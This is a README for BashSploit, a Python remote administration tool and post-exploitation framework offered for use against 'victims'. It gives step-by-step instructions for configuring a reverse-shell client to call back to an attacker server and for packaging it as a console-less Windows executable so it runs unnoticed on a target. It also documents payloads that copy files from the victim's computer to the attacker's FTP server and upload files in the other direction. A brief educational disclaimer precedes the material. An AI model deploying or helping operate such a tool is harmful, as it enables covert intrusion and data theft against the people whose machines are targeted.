# BashSploit

## Overview

BashSploit is a multi-client Remote Administration Tool (RAT) and post-exploitation framework. It provides attackers with a reverse shell and various payloads once deployed on a target machine.

**Disclaimer**: Unauthorized access to computer systems is illegal. This tool is intended solely for educational and proof-of-concept purposes.

## Features
* [x] Reverse shell
* [x] File download from the client machine
* [x] File upload to the client machine
* [ ] Webcam snapshot and livestream
* [ ] Audio recording and streaming
* [ ] Screenshot capture
* [ ] File encryption on the client machine
* [ ] Wallpaper modification on the client machine
* [ ] Keylogging

## Supported Platforms
- The `reverse shell` payload has been tested on Linux and Windows.
- Other payloads, such as `screenshot` and `wallpaper-changing`, have been tested only on Windows.

## Setup/Installation Requirements

### Prerequisites
* Python 3
* Virtual environment setup:
```sh
python -m venv virtual
# Unix
source virtual/bin/activate
# Windows CMD
virtual\Scripts\activate
```

* `pip install -r requirements.txt`

## Usage

### Server
- `python runserver.py` for the server to listen for connections.
- edit `server/settings.py` to configure TCP server and FTP server settings.
- Enter Host/Server address, to get an interactive prompt where you are able to view connected clients, select a specific client, and get a reverse shell

For help
```
Bashsploit> help
help:	Shows this help list
list:	show  connected targets
about:	print details about Bashsploit
show payloads:	show additional payloads
select:	Selects a target by its index. Takes index as a parameter
quit:	Stops current connection with a target. To be used when target is selected
shutdown:	Shuts server down
```
### Client & server - getting a reverse shell.
- First edit the clients configurations in `client/settings.py`.
```python
......
SERVER_ADDR= '127.0.0.1' # server address
SERVER_PORT=999 #server port, should be an integer not string
RETRY_TIME=5 #in seconds
......
```
- `python shellverse.py` on the client machine to make a tcp socket connection to the server
- check the running server instance and connect to client using `select` command.

### Payloads
- Refer to `payloads/abstract_payload_handler.py` to see how to write a payload class.
- To uses a payload add it to the payload registry in `payloads/payload_register.py`.
- Only payloads whose platform match the configured platform in `client/settings.py` will be selected.
- Shellverse comes with some payload examples, you can easily add yours by implementing `AbstractPayloadHandler` interface.
- When I get time i'll write a wiki for this payloads
```
[1]ftp-upload: uploads a file from the attackers ftp server to the victims computer.
          usage~ ftp-upload file-path

[2]ftp-download: downloads a file/folder from the victims computer to our ftp server.
            usage~ftp-download file-path
```

### Making a windows executable and getting a reverse connection
- You can make a noconsole exe to run on the target.
`pyinstaller --noconsole --onefile shellverse.py`
run `pyinstaller --help` for more options such as an icon for the exe file.

### Getting a reverse connection
- Execute the exe in the targets machine, run the server script on the Host machine and a wait a reverse connection.
```
shellverse> 
Connection has been established: DESKTOP-R5UIHJE (192.168.0.31)
```

## Contributing
- Fork  the repo, add payloads(using the documented method) / fix bugs or any other contribution, and make a pull request.

## License
This project is Licensed under the MIT open source license
